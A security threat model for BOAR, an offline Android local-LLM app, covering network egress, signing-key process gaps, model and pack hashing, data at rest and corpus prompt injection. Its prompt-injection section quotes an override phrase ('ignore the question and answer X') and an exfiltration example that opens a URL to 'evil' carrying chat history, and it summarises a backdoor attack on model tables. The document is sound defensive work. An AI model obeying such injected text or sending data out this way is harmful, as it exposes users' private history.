# BOAR threat model: what "private" means, and what is actually provable

TL;DR
- **The BOAR offline APK is offline by construction, and this is independently verifiable.** It declares no `INTERNET`, no network-state permission, no GMS, no tracker SDK, and its native libs import no socket calls (measured with `offline-proof/audit_apk.py`, reports in `offline-proof/reports/`). This is the one strong property today, and it matches a competitor team and a competitor team.
- **Signing: 0 HIGH on the published APK, 1 MEDIUM process gap.** The published release `UPSTREAM_REPO/boar-app` v1.0.0 (`de9e3156…3c01`, matches the release `.sha256`) is signed with BOAR's **own key** (`O=sopa.team, CN=BOAR`, cert SHA-1 `497D5E09…0B67`, SHA-256 `7cf514f9…1f01`), verified by the coordinator and re-measured by the kit. The gap is process: **20/20** local/test APKs in `builds/android/` use the *public* RN/Expo `debug.keystore` (SHA-1 `5E:8F:16:06:…:F6:25`), and `plugins/withReleaseSigning.js` silently falls back to it when `BOAR_UPLOAD_*` is unset (fail-open). The cert fingerprint is not published, so users can't tell the two apart.
- **The published v1.0.0 is not the offline flavor.** It declares `INTERNET` (+ `SYSTEM_ALERT_WINDOW`, `RECORD_AUDIO`, legacy storage), leaves `allowBackup` at its default with no extraction rules, and says "open it once online to download the ~1 GB default model" (release notes). Offline-during-use there is a runtime policy, not a kernel guarantee. Only the local offline build `1928502d` is offline by construction (MEDIUM for the claim: ship the offline flavor, with its own key, as the verifiable artifact).
- **"0 B sent" is a promise, not a measurement.** No counter exists in code: there is no `bytesSent`/`TrafficStats` anywhere in `boar-app/src`. The badge exists only as a design decision (`review/DECISIONS-2026-09-30.md:48,50`). The header shows a static "Offline" label (`src/ui/ChatHeader.tsx:43-46`), and COMPLIANCE says "Not yet recorded: the same capture on a real phone" (`docs/COMPLIANCE.md:175`).
- Supply chain for models/packs is **hashed (sha256 pinned in the bundle, commit-pinned URLs) but not signed**. Trust = APK + GitHub/HF accounts. Data at rest is **unencrypted SQLite in app-private storage**, with backup disabled in the offline build. That is fine given Android file-based encryption, as long as the installed APK carries BOAR's own key (a debug-signed install can be "updated" by anyone).
- Corpus prompt injection has **low impact today** because the model has no tools, links or actions. It becomes high the day any Ethereum/tool hook ships.

Scope: Android offline flavor (bounty target) and the published v1.0.0 release, with the downloader flavor where it differs. iOS is out of scope. Code read: `boar-app` @ `7aa67d5` (read-only). All `boar-app` paths below are relative to `<workspace>/boar-app/`.

---

## 0. What "private" should mean here

Vitalik's frame, via Lantern (quotes verified against source HTML by Lantern, 2026-09-30):

| Quote | Source |
|---|---|
| "If something can be done locally, it should be done locally." / locally-running computation gives "advantages in reducing latency and improving verifiability" | [vitalik.eth.limo 2025-04-14 privacy](https://vitalik.eth.limo/general/2025/04/14/privacy.html) |
| "The more questions that can be answered entirely by searching a 1 TB dump of stuff I have already downloaded, the less any search engine learns about me." / "open LLMs are open-weights, almost all are not open-source." | [vitalik.eth.limo 2026-04-02 secure LLMs](https://vitalik.eth.limo/general/2026/04/02/secure_llms.html) |
| "if you're literally offline, magic remote FHE inference won't help you" (bounty origin) | [x.com/VitalikButerin/status/2100695863026954698](https://x.com/VitalikButerin/status/2100695863026954698) |
| Verifiability through "locally running watcher LLMs" checking apps | [vitalik.eth.limo 2025-09-24 openness & verifiability](https://vitalik.eth.limo/general/2025/09/24/openness_and_verifiability.html) |
| messaging-daemon: "give your local LLM sandboxed access to your personal data without enabling exfiltration" | [github.com/vbuterin/messaging-daemon](https://github.com/vbuterin/messaging-daemon) |
| A competitor team copy under `competitor-b` keeps llama.cpp changes as auditable `.patch` files over an unmodified upstream submodule pin, plus a deterministic pack toolchain | per Lantern (5 commits, author `[email removed]`, unsigned). Vitalik's authorship is **[I]**, not verified. Not opened by Veil |

So "private" is **five checkable properties**, not a vibe:

| # | Property | Question a third party asks | Verifiable how |
|---|---|---|---|
| P1 | **No egress during use** | Can this exact APK talk to the network? | Static: permissions + kernel enforcement. Dynamic: per-UID netstats (`offline-proof/DYNAMIC-TEST.md`) |
| P2 | **No third-party dependency** | Does it need Google (GMS) or any account? | Static: DEX classes, `uses-library` |
| P3 | **Integrity of what runs** | Is this the APK/model/pack the authors published, and can I rebuild it? | Signer cert, sha256 manifest, reproducible build |
| P4 | **Confidentiality at rest** | Who else on the phone, or with the phone, can read my questions? | Storage location, backup flags, encryption, signing key |
| P5 | **Integrity of answers vs. corpus** | Can downloaded text make the app act against me? | Prompt construction, tool surface |

Non-goal: "verifiable truth" of answers. BOAR's own framing is right: "proveniência verificável, nunca verdade verificável" (`review/BOAR_INFO_NODE.md:91`).

## 1. Assets and adversaries

| Asset | Where it lives |
|---|---|
| User questions, chat history, answers | `aoair_knowledge.db` (SQLite) in app-private `filesDir/SQLite` (`src/rag/db.ts:6,91-185`) |
| Imported documents (PDFs) | copied to cache (`src/services/documentImporter.ts:157-160`), chunked into the same DB |
| Location for "near me" | in memory, GPS or passive provider (`modules/offline-location/.../OfflineLocationModule.kt:22-26,124,152`) |
| Interest signal (which city/pack you download) | HF request logs, downloader flavor only (`src/rag/poiRegions.ts`) |
| Model weights, knowledge packs | app storage, pinned by sha256 in `src/models/manifest.ts:27-85` |

| Adversary | Capability | In scope? |
|---|---|---|
| A1 Network observer / ISP / hotspot | sees traffic if any exists | yes (P1) |
| A2 Asset host (Hugging Face, GitHub) | sees IP + which file; can serve altered files if pins are weak | yes (P3, and interest leak in downloader) |
| A3 Malicious or compromised app author / CI | ships a bad APK or pack | yes (P3) |
| A4 **Impersonating publisher** (anyone with the public debug key) | ships an "update" that Android accepts over a *debug-signed* install | yes. Closed for the published v1.0.0 (own key). Open for testers running `builds/android/*` (P3/P4) |
| A5 Co-installed app on the phone | reads shared storage; receives intents | yes (P4, indirect egress) |
| A6 Google Play Services / OEM services | privileged process with its own network | yes (P2) |
| A7 Poisoned corpus text (Wikipedia dump, user PDF) | injects instructions into the prompt | yes (P5) |
| A8 Physical attacker with an unlocked phone | UI access | partial (out of scope for crypto; FBE covers the locked state) |
| A9 Nation-state baseband/OS compromise | everything | no |

## 2. Threats by surface

Severity reflects BOAR offline flavor today. Status: ✅ holds · ⚠️ partial · ❌ open.

### T1. Network egress (P1)

| Threat | BOAR evidence | Status |
|---|---|---|
| App opens sockets | Offline APK `1928502d`: no `INTERNET`/`ACCESS_NETWORK_STATE`/Wi-Fi perms (`offline-proof/reports/boar-integration-1928502d-offline-arm64.md` §1). The plugin blocks them (`plugins/withBuildVariant.js:23-29,111-115`) even though `expo-file-system` declares INTERNET (`node_modules/expo-file-system/android/src/main/AndroidManifest.xml:2`). Without INTERNET the UID cannot open sockets, localhost included ([Android INTERNET](https://developer.android.com/reference/android/Manifest.permission#INTERNET); `review/ETH_NODE_INTEGRATION.md:106`) | ✅ |
| Native code phones home (llama.cpp downloaders) | No BOAR `.so` imports `socket/connect/getaddrinfo` (audit §7, cross-checked with `llvm-nm`). a competitor team and a competitor team `libllama-common.so` *do* import them, dead without INTERNET | ✅ |
| Analytics/telemetry SDK | 0 tracker classes in any BOAR build (audit §4). JS side: `executionTelemetry` is local SQLite, exported only via share sheet (`src/services/executionTelemetry.ts:74-78`) | ✅ |
| DNS leak | Needs a socket to the resolver, so denied with sockets. UNKNOWN: not measured; covered by DYNAMIC-TEST R2 | ✅ (inferred) |
| Dead network code in offline bundle | Offline bundle still contains 22 HF model/pack URLs, GitHub release + raw URLs (audit §8). Download/search/share are gated at runtime by `networkAllowed()` (`src/config/variant.ts:19-21`), not stripped. Inert without INTERNET, but it muddies third-party audits | ⚠️ |
| OTA / remote JS loading | `expo.modules.updates.ENABLED=false` in manifest meta-data; only `updatesinterface` classes. The dev-launcher is **dead code**: the APK has the `disableInRelease` stub (`node_modules/expo-dev-launcher/android/src/disableInRelease/java/.../ExpoDevLauncherModule.kt`: `AsyncFunction("loadApp") { uri: Uri -> }`, an empty body; `DevLauncherPackageDelegate` returns empty lists). DEX has `loadApp` but no `DevLauncherController`/`DevLauncherActivity`/`getRecentlyOpenedApps`. `src/` has no incoming-URL handler (`getInitialURL`/`addEventListener('url')`), so the exported `exp+boar-app://` scheme only opens `MainActivity` | ✅ (INFO) |
| Published v1.0.0 is network-capable | `offline-proof/reports/boar-v1.0.0-arm64.md`: `INTERNET` declared; same JS gates as the downloader. Offline-during-use is not provable statically for the artifact people actually download | ⚠️ MEDIUM (claim) |
| Downloader flavor egress | HF/GitHub downloads (`src/models/ModelManager.ts:465,607`), HF model **search sends the query text** (`src/services/modelBrowser.ts:20,42-52`), Supabase results share (`src/eval/shareResults.ts:40,71`, user-confirmed). City pack downloads reveal the user's city + IP to HF | ⚠️ by design, under-documented |

### T2. Google Play Services (P2)

| Threat | Evidence | Status |
|---|---|---|
| Needs GMS | 0 GMS/Firebase/ML Kit classes, no GMS `uses-library` (audit §3). Location uses `LocationManager` GPS + passive, no Fused (`OfflineLocationModule.kt:22-26`) | ✅ |
| Delegated egress through privileged services | Voice input runs in the system speech provider's process (usually Google), which has its own INTERNET. The offline flavor disables voice (`src/voice/voicePolicy.ts:38-46`; RECORD_AUDIO absent in APK). Passive location may reuse a network-assisted fix from another app (no traffic, but not pure GPS) | ✅ offline / ⚠️ downloader |

### T3. Supply chain (P3)

| Threat | BOAR | a competitor team | a competitor team | Status (BOAR) |
|---|---|---|---|---|
| **APK signing key** | **Published v1.0.0: own key** `O=sopa.team, CN=BOAR`, cert SHA-256 `7cf514f9ab8253cbd78eb7d112d66fd05c2ad27e6fc987bf8f3276a7eedf1f01` (SHA-1 `497D5E096DAD161939FC07018314CE35EF0A0B67`), **not published** in README/release notes. **Process gap:** 20/20 APKs in `builds/android/` are signed with the public RN/Expo debug key `fac61745…3b9c` (`CN=Android Debug`, identical to `wt/devicelab/android/app/debug.keystore`; fingerprint: [expo/eas-cli#3127](https://github.com/expo/eas-cli/issues/3127)), because `plugins/withReleaseSigning.js` falls back to it when `BOAR_UPLOAD_*` is unset (fail-open) | own key, cert published (`a competitor team/INSTALL.md:35-36`) | own key `13112751…b666`, published (`docs/compliance/release-audit.md:23`) | ⚠️ **MEDIUM** (process) |
| Model/pack integrity | sha256 pinned in the bundle, checked after download and on import with native streaming SHA-256 (`ModelManager.ts:359-366,717-728`; `modules/file-hash/.../FileHashModule.kt:82`). URLs commit-pinned (seen in the APK bundle: `huggingface.co/.../resolve/<40-hex>/…`). Empty `sha256` skips the check (`ModelManager.ts:262,720`). That is intentional for HF-search results without LFS metadata (comment at `:259-261`; `modelBrowser.ts:62,80`). **All 39 bundled catalog entries** (`models/manifest.ts`, `rag/wikiEnPacks.ts`, `rag/poiRegions.ts`, `rag/preparedness.ts`, `rag/cryptoPack.ts`) carry a valid 64-hex sha256, measured by importing the modules and walking every `sourceUrl`, 0 missing. Residual: LOW (user-searched models are size-checked only) | host-side sha256 only (`scripts/install.sh:66-70`). URLs `resolve/main` (mutable) | on-device sha256 per artifact + strict manifest (`PackManifestParser.kt`) | ⚠️ |
| Signed manifests | none. Trust = whoever controls the APK + `the app maintainer`/`r4to` accounts | none | none | ⚠️ (all equal) |
| Reproducible build | no procedure found. UNKNOWN: not attempted | none (`review/competitor-a.md:29`) | unsigned release APK "for reproducibility checks" + CI `cmp` of packs (`competitor-b/.github/workflows/android.yml:38-62`) | ❌ |
| Backdoor in non-backbone tables (n-gram, PLE, drafters) | BadEngram ([arXiv 2609.13478](https://arxiv.org/abs/2609.13478), via Lantern `rnd/lantern/radar.md` §h): 96.6% attack success in a controlled Engram model and **50.4% via the PLE tables of Qwen3.8-Flash-Next with the backbone untouched**. An unchanged backbone proves nothing. BOAR's catalog includes Gemma 4 E4B (PLE model, `manifest.ts:209-210`). Today it ships as one GGUF, so the whole-file sha256 covers the PLE tensors. **Rule:** any table that ships or is offloaded as a separate file (n-gram, PLE, speculative drafter) gets its own manifest entry + sha256. UNKNOWN: paper not read by Veil. Single-file PLE for this GGUF is inferred from the single `sourceUrl` | n/a | n/a | ✅ today / design rule |
| On-device tampering of weights | app-private storage (good) | `MANAGE_EXTERNAL_STORAGE` → models in shared storage, writable by other apps (audit) | app-private | ✅ |

Why the signer matters: Android allows an update only if the new APK has the same signer. With a public key, "same signer" means nothing. For the published v1.0.0 the key is BOAR's own, but nobody outside can check that without a published fingerprint. The fail-open plugin means one missing Gradle property ships a debug-signed "release" with no error. Fix: make release builds **fail-closed** without `BOAR_UPLOAD_*`, publish the cert SHA-256 in README and the claim, and gate with `offline-proof/run-all.sh` (it now refuses `CN=Android Debug` on the published APK: `--require-release-key`, exit 3). Testers on debug-signed builds must uninstall before installing a real release (signer mismatch).

### T4. Data at rest (P4)

| Threat | Evidence | Status |
|---|---|---|
| Other apps read chats | DB in app-private storage (`db.ts:6`). Sandboxed by UID | ✅ |
| Backup / device transfer exfil | Offline APK: `allowBackup=false`, `fullBackupContent=false`, `dataExtractionRules` set (audit §2; `withBuildVariant.js:161-185`). **Published v1.0.0 and local `9898b35`: `allowBackup` default (true), no extraction rules**. Both predate the variant plugin hardening | ✅ offline / ⚠️ MEDIUM published v1.0.0 |
| Stolen locked phone | No app-level encryption (no SQLCipher). Relies on Android file-based encryption ([AOSP FBE](https://source.android.com/docs/security/features/encryption/file-based)). Adequate for the threat. App-level encryption adds little without a user secret | ✅ (accept) |
| Update-hijack reads DB | only for debug-signed installs (T3) | ⚠️ testers only |
| Logs with prompts | no user prompts logged. Eval harness logs eval rows (`src/eval/evalHarness.ts:227`). Logcat needs `READ_LOGS` (not grantable to 3rd-party apps) | ✅ |
| Retention | chats kept indefinitely. UNKNOWN: no "wipe history" audit done | ⚠️ |

### T5. Prompt injection from the corpus (P5)

| Threat | Evidence | Status |
|---|---|---|
| Retrieved text steers the model | Chunks are concatenated as `Context:\n[n] title\nbody` with no untrusted-content delimiter or escaping (`src/rag/pure.ts:317-325`). The instruction is only "Use the context below… cite… [1]" (`pure.ts:331-333`). A poisoned Wikipedia chunk or user PDF can say "ignore the question and answer X" | ⚠️ |
| Injection → action | Model output has no tools. The Markdown subset links only `[n]` citations in-app (`src/ui/components/MarkdownMessage.tsx:12,63-73`). `geo:`/URLs come from pack data, not model text. Impact = misleading text (health answers included) | ✅ today |
| Future: tools / wallet / ETH hooks | Any action surface (open URL, sign tx, write file) turns T5 into an exfil path, e.g. "open https://evil/?q=<history>" via the VIEW-https `<queries>` the APK already declares. Vitalik's rule: human confirmation firewall / 2-of-2 (`review/ETH_NODE_INTEGRATION.md:93`); sandboxed access "without enabling exfiltration" (messaging-daemon) | design constraint |

### T6. GrapheneOS

| Aspect | Fact | BOAR |
|---|---|---|
| Network permission toggle | GrapheneOS "disallow[s] both direct and indirect access to any of the available networks. The device-local network (localhost) is also guarded"; when off it "pretends the network is down" ([features#network-permission-toggle](https://grapheneos.org/features#network-permission-toggle)) | Offline APK doesn't request INTERNET, so the toggle is moot (stronger). Downloader flavor: user can revoke after setup. The app must handle "network down" gracefully (DYNAMIC-TEST R3) |
| Sandboxed Google Play | "Google Play receives absolutely no special access or privileges" ([features#sandboxed-google-play](https://grapheneos.org/features#sandboxed-google-play)) | Irrelevant: no GMS dependency |
| Storage Scopes | alternative to storage permissions ([features#storage-scopes](https://grapheneos.org/features#storage-scopes)) | BOAR uses SAF/document picker, no storage perms. a competitor team's `MANAGE_EXTERNAL_STORAGE` would benefit |
| Tested on device | UNKNOWN for BOAR, a competitor team and a competitor team (a competitor team explicitly hedges: `competitor-b/docs/verification.md:29`). No Vitalik statement on GrapheneOS found (Lantern) | ❌ untested |

### T7. Claims vs. reality (verifiability of the promise itself)

| Claim | Where | Reality |
|---|---|---|
| "0 B sent" badge | `review/DECISIONS-2026-09-30.md:48,50` | Not implemented. A JS counter would miss native/OS traffic. The honest source is the kernel per-UID counter (`TrafficStats.getUidTxBytes(myUid)`) |
| "Nothing leaves your phone… no API" | `MANIFESTO.md:22-23` | True for the offline APK. False for downloader (HF search query, Supabase share) |
| "The **only** network call site in `src/`…" | `ARCHITECTURE.md:94-97` | Stale: also `modelBrowser.ts`, `shareResults.ts` |
| "Audio is never sent to a server" | `app.json:16` (iOS permission string) | OK on iOS (`requiresOnDeviceRecognition = true`, `modules/voice-input/ios/VoiceInputModule.swift:116`). On Android the downloader's system recognizer "may send audio to its provider" and the UI says so (`src/i18n/locales/en.json:1064,1087`). Consistent, but keep the wording platform-specific |
| Location "never sent anywhere" | `app.json:20` (iOS permission string) | `geo:` hand-off to a maps app (`src/ui/chat/PlacesCard.tsx:189`): user-initiated, and the maps app may go online |
| Emulator capture "0 bytes" | `docs/COMPLIANCE.md:163-172` | Real-phone capture "Not yet recorded" (`:175`) |

## 3. Scorecard vs. competitors (static, measured 2026-09-30)

| Property | BOAR offline `1928502d` (local) | BOAR published v1.0.0 | a competitor team 1.0.0 | a competitor team 1.1.10 |
|---|---|---|---|---|
| P1 no INTERNET | ✅ | ❌ declares INTERNET | ✅ | ✅ |
| P1 no native socket imports | ✅ (none) | ✅ (none) | ⚠️ llama-common (dead) | ⚠️ llama-common (dead) |
| P2 no GMS / trackers | ✅ / ✅ | ✅ / ✅ | ✅ / ✅ | ✅ / ✅ |
| P3 own signing key | ❌ public debug key (test build) | ✅ `CN=BOAR` | ✅ | ✅ |
| P3 cert fingerprint published | ❌ | ❌ | ✅ | ✅ |
| P3 on-device sha256 of assets | ✅ (39/39 catalog; HF search size-only, LOW) | ✅ same code path | ❌ host-side only | ✅ strict |
| P3 reproducible build path | ❌ | ❌ | ❌ | ⚠️ unsigned APK + pack `cmp` in CI |
| P4 backup off | ✅ | ⚠️ default, no rules | ✅ | ⚠️ default + extraction rules |
| P4 assets in private storage | ✅ | ✅ | ❌ shared storage | ✅ |
| P5 no action surface | ✅ | ✅ | ✅ (UNKNOWN: not read) | ✅ (UNKNOWN: not read) |
| Measured on a real phone | ❌ | ❌ | UNKNOWN (airplane-mode demo plan) | ⚠️ hedged |

Source for every ✅/❌ in rows 1–4, 8: `offline-proof/reports/*.md` (the published APK was downloaded with `gh release download v1.0.0 -R UPSTREAM_REPO/boar-app`, audited, and deleted; rerun with `FETCH_PUBLISHED=1 bash offline-proof/run-all.sh`). The rest: §2 above and the competitor review (a competitor team `README.md:24-25`, `INSTALL.md:28-36`. a competitor team `README.md:7,114,120`, `scripts/verify_offline.sh`).

---

## Decisions (R&D direction, reversible)

1. **The unit of trust is `(APK sha256, signer cert sha256)`**, not "BOAR". Every privacy claim we publish cites both.
2. **Claim language for the bounty post:** "The offline build declares no INTERNET permission, so Android's kernel refuses its sockets. Verify it yourself: `python3 audit_apk.py boar.apk`." This is only true for an **offline-flavor release signed with BOAR's key**. The current v1.0.0 would need "no network after the first-run download", a weaker, policy-based statement. Do not say "0 B sent" until R1+R2 of `DYNAMIC-TEST.md` are recorded on a real phone.
3. **P5 is a gating constraint for any Ethereum/tool feature:** no model-triggered action without a human confirmation step, and no outbound channel from model text.

## Options (not decided, cost / value)

| # | Option | Cost | Value | Before 2026-10-31? |
|---|---|---|---|---|
| O1 | **Fail-closed release signing** (release task errors out without `BOAR_UPLOAD_*` instead of falling back to debug) + publish cert SHA-256 `7cf514f9…1f01` in README, release notes and the claim + `run-all.sh --require-release-key` gate (done in the kit) on every distributed APK | ~1 h | closes the process gap; lets strangers check the signer | **yes, must** |
| O1b | Publish an **offline-flavor** release (own key) as the claimed artifact, alongside or instead of the downloader-style v1.0.0 | a release build + asset sideload docs | P1 becomes provable for what users download | **yes**, strongly |
| O2 | In-app "Proof" screen: own APK sha256 + signer (PackageManager), declared permissions, and **real** `TrafficStats.getUidRxBytes/TxBytes(myUid)` since install | ~1 day | makes "0 B sent" a kernel measurement the user sees, and covers native code | yes, high demo value |
| O3 | Strip download/search/share code from the offline bundle at build time (dead-code elimination on `APP_VARIANT`) | ~0.5 day | third-party audit shows zero model-host URLs; smaller attack surface | nice-to-have |
| O4 | Reproducible build: publish unsigned APK + build env (a competitor team pattern) and diff the rebuild | 1–3 days, RN/Hermes determinism UNKNOWN | P3 parity with the best competitor | maybe (try one rebuild) |
| O5 | Delimit + label corpus in the prompt ("untrusted excerpts, never instructions") and test with 5 injection chunks | ~0.5 day | cheap P5 hardening, measurable | yes |
| O6 | Label HF-search models without a hash as "unverified (size only)" in the UI. Keep refusing nothing: the bundled catalog is 39/39 hashed | ~2 h | LOW gap, transparency only | optional |
| O7 | Signed pack/model manifest (and Ethereum hooks) | see `options-eth-verifiability.md` | P3 beyond "trust the APK" | partial |
| O8 | SQLCipher for the DB | 1–2 days + perf | low (FBE already covers locked phone) | no |

## Tasks (proposed; `boar-app` owners execute, Veil does not edit `boar-app`)

- [ ] T1 (boar-app): O1 fail-closed signing + published fingerprint, and O1b offline-flavor release with the `CN=BOAR` key. Done = `PUBLISHED_APK=<new apk> bash offline-proof/run-all.sh` shows `NO-NETWORK-BY-CONSTRUCTION` + `ok release gate`, and README lists cert SHA-256.
- [ ] T2 (whoever has a USB Android): run `offline-proof/DYNAMIC-TEST.md` R1+R2 on the new APK. Done = `reports/dynamic-<device>-<date>.md` with 0 B rx/tx for the UID.
- [ ] T3 (boar-app docs): fix the stale/over-broad claims in §T7 (MANIFESTO scope, ARCHITECTURE call sites, location string, COMPLIANCE real-phone gap). Done = MANIFESTO/ARCHITECTURE/COMPLIANCE/app.json strings match the audit.
- [ ] T4 (boar-app): O5 (+ O6 label). Done = a 5-case injection fixture in tests.
- [ ] T5 (Veil): GrapheneOS run of R3 when a Pixel is available. Done = recorded result or explicit "not tested" in the claim.

## Metric + next step

- **Metric:** **0 HIGH on the published APK; 1 MEDIUM process** (debug-key fallback, fingerprint unpublished) **+ 2 MEDIUM on published v1.0.0** (network-capable by construction, backup default) **+ 1 LOW** (HF-search size-only). 0 network-capability findings in the offline APK. P1–P5 scored for 4 APKs from measured reports.
- **Next step:** T1 (fail-closed signing + offline-flavor release with the BOAR key), then T2 (dynamic capture). Together they turn the claim from "trust us" into "(hash, cert, 0 B measured)".

## UNKNOWN

- RESOLVED: the published v1.0.0 uses BOAR's own key (coordinator + kit). Still UNKNOWN: which APK testers actually have installed, and which APK the claim will point to (v1.0.0 downloader-style, or a new offline release).
- Real-phone and GrapheneOS behaviour for all three apps (no device used in this pass).
- DNS behaviour without INTERNET is inferred from socket denial, not measured.
- DownloadManager acting on behalf of an app without INTERNET: AOSP source not checked.
- RN/Hermes build determinism (O4 feasibility).
- `competitor-b` details are reported by Lantern, not opened by Veil, and Vitalik's authorship is [I] (unsigned commits, generic email). No Vitalik statement on GrapheneOS was found.
- a competitor team and a competitor team prompt construction (P5) was not read.
